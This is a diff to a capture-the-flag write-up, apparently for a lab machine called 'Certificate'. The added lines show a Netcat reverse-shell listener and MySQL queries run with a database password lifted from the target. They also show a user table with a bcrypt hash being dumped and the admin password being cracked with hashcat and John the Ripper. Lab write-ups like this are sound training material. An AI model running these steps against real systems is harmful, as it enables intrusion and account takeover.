@@ -103,7 +103,7 @@ Navigating to the web service hosted on port 80 reveals a brightly themed educat
 </div>
 
 <p class="indent-paragraph">
-Exploring the "Courses" section of the platform reveals that course details are publicly accessible through parameterized URLs such as <code>course-details.php?id=2</code><span class="codefix">.</span> Each course page displays structured information including the trainer's name, course fee, estimated duration, and a detailed objective section.
+After creating a student user and successfully logging into the platform, we began navigating through its main functionalities. Exploring the "Courses" section of the platform reveals that course details are publicly accessible through parameterized URLs such as <code>course-details.php?id=2</code><span class="codefix">.</span> Each course page displays structured information including the trainer's name, course fee, estimated duration, and a detailed objective section.
 </p>
 
 <div style="margin-top: 20px;">
@@ -171,11 +171,11 @@ With the payload archive crafted, we proceeded to upload the file through the pl
 </div>
 
 <p class="indent-paragraph">
-To catch the reverse shell connection, we started a listener on port 1234 using Netcat. Once the uploaded payload was accessed, a successful connection was established from the target host, spawning a PowerShell session with the privileges of the <code>xamppuser</code><span class="codefix">.</span> This confirms code execution and marks the initial foothold into the system.
+To catch the reverse shell connection, we started a listener on port 1234 using <code>rlwrap</code> in conjunction with Netcat for improved terminal interaction. Once the uploaded payload was accessed, a successful connection was established from the target host, spawning a PowerShell session with the privileges of the <code>xamppuser</code><span class="codefix">.</span> This confirms code execution and marks the initial foothold into the system.
 </p>
 
 ```
-~$ nc -lvnp 1234                                                            
+~$ rlwrap nc -lvnp 1234                                                            
 listening on [any] 1234 ...
 connect to [IP] from (UNKNOWN) [IP] 63003
 
@@ -234,6 +234,82 @@ try {
 }
 ?>
 ```
+
+<p class="indent-paragraph">
+With an active reverse shell, we leveraged our knowledge of the XAMPP directory structure to interact directly with the MySQL service. By executing the MySQL binary located at <code>C:\xampp\mysql\bin\mysql.exe</code>, we successfully authenticated using the extracted credentials and listed the available databases. This confirmed access to <code>certificate_webapp_db</code>.
+</p>
+
+```
+~$ PS C:\xampp\htdocs\certificate.htb> & "C:\xampp\mysql\bin\mysql.exe" -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "SHOW DATABASES;"
+
+Database
+certificate_webapp_db
+information_schema
+test
+```
+
+<p class="indent-paragraph">
+Continuing the enumeration, we queried the <code>certificate_webapp_db</code> and identified four tables of interest, particularly <code>users</code>, which revealed a list of registered accounts along with their bcrypt-hashed passwords. Among the entries, we found <code>sara.b</code>, the only user assigned the <code>admin</code> role, indicating her elevated privileges within the application. This discovery highlights a valuable authentication target for lateral movement or privilege escalation.
+</p>
+
+```
+~$ PS C:\xampp\htdocs\certificate.htb> & "C:\xampp\mysql\bin\mysql.exe" -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "SHOW TABLES;" certificate_webapp_db
+
+Tables_in_certificate_webapp_db
+course_sessions
+courses
+users
+users_courses
+
+~$ PS C:\xampp\htdocs\certificate.htb> & "C:\xampp\mysql\bin\mysql.exe" -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; select * from users;"  -E
+
+<skip>
+*************************** 6. row ***************************
+        id: 10
+first_name: Sara
+ last_name: Brawn
+  username: sara.b
+     email: sara.b@certificate.htb
+  password: $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
+created_at: 2024-12-25 21:31:26
+      role: admin
+ is_active: 1
+```
+
+<p class="indent-paragraph">
+To accurately determine the format of the extracted hash, we used the <code>hashcat --identify</code> command with the contents of the file containing <code>sara.b's</code> password hash. The output revealed a match with the <code>bcrypt $2*$</code> format (mode <code>3200</code>), which is commonly employed in Unix-like systems and modern web applications.
+</p>
+
+```
+~$ hashcat --identify hash-sara-b.txt 
+The following 4 hash-modes match the structure of your input hash:
+
+      # | Name                                                       | Category
+  ======+============================================================+======================================
+   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
+  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
+  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
+  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
+```
+
+<p class="indent-paragraph">
+John the Ripper tool was executed against the extracted password hash using the popular <code>rockyou.txt</code> wordlist. Within seconds, the password for the admin account <code>sara.b</code> was successfully recovered as <code>Blink182</code><span class="codefix">.</span>
+</p>
+
+```
+~$ john --wordlist=/usr/share/wordlists/rockyou.txt hash-sara-b.txt 
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
+Cost 1 (iteration count) is 16 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+~$ Blink182         (?)     
+1g 0:00:00:01 DONE 0.7299g/s 8934p/s 8934c/s 8934C/s auntie..vallejo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
 
 ---
 <p class="indent-paragraph">
